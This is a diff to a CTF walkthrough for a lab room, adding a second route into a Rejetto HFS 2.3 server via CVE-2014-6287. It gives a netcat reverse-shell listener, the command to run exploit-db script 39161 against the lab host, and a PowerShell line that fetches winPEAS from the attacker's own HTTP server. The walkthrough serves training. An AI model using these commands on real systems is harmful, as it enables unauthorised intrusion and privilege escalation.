@@ -54,7 +54,7 @@ Our nmap revealed that this was HttpFileServer httpd 2.3. We still need to find 
 3. What is the CVE number to exploit this file server?
 
 This could be a point of initial access. Let's check [Exploit-DB](https://www.exploit-db.com/) with the information we now have.
-Looks like we can use [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) using CVE-2014-6287. If it doesn't work... there appears to be a newer exploit (2), but the first one involved metasploit so we are going to be using that one.
+Looks like we can use [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) using CVE-2014-6287. If it doesn't work... there appears to be a newer exploit using python, but the first one involved metasploit so we are going to be using that one.
 
 3. Use Metasploit to get an initial shell. What is the user flag?
 Looks like it's time to hop over to Metasploit and get a shell on this server!
@@ -252,4 +252,47 @@ dir "\root.txt*" /s
 
 One of the best ways to get better at CTFs like this is to find alternatives. There's almost always plenty of other options/paths you can take and you can learn a lot from finding new routes.
 
-For this one let's backtrack to the other exploit we saw in Task 2, we will be using the same vulnerability, but a new [exploit](https://www.exploit-db.com/exploits/39161). We saw this earlier in exploit-db.
+For this one let's backtrack to the other exploit we saw in [Task 2] (https://github.com/RG9n/RG9n.github.io/blob/main/write-ups/steelmountain.md#task-2--initial-access), we will be using the same vulnerability, but a new [exploit](https://www.exploit-db.com/exploits/39161) using python. We saw this earlier in exploit-db.
+
+Based on this exploit, it looks like we will need to:
+* Open 3 terminal windows.
+* Download [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release) binary.
+* Download [Netcat static](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) binary.
+* Download The python script from exploit-db (I put all 3 of these files in the SteelMountain directory).
+* Edit the python script with your tun0 OpenVPN IP and the port you will be listening on (make sure not to use one already in use).
+* Make sure that your netcat binary matches up with the nc.exe in the exploit script and that all required files/terminals are in the same SteelMountain folder.
+* The first terminal will run our python http server.
+
+```
+
+```
+
+* The second terminal will be our static netcat binary listening on the port we selected(4449).
+
+```
+nc -lvnp 4449
+```
+
+* The third terminal will be used to execute our attack by running the exploit on the MACHINE_IP on port 8080 of the room since that is the port assosciated with the vulnerable file server.
+
+```
+python 39161.py 10.10.98.28 8080
+```
+
+This exploit script will have to be ran twice because the first one is used to pulls the static netcat binary to the target and the second is execution of the payload for callback.
+
+Once you get a win on the shell, it is time to use winPEAS for some awesome script priviledge escalation. Run a powershell script to get winpeas from the HTTPServer you are hosting using your tun0 IP.
+
+5. What powershell -c command could we run to manually find out the service name?
+This is a good cmdlet to know, but not really useful due to winPEAS. winPEAS will tell you the service to target, but this is an option for manually finding the service.
+
+```ps
+powershell -c Get-Service #manually find service
+powershell -c wget "http://Tun0-IP/winPEAS.exe"
+```
+
+Run winPEAS and you will see that it is pointing towards those unquoted paths from earlier along with the same service name.
+
+### Congratulations! You're done with the room!
+
+Feel free to reach out to me on [twitter](https://twitter.com/R_G_9_n) if you have any questions.
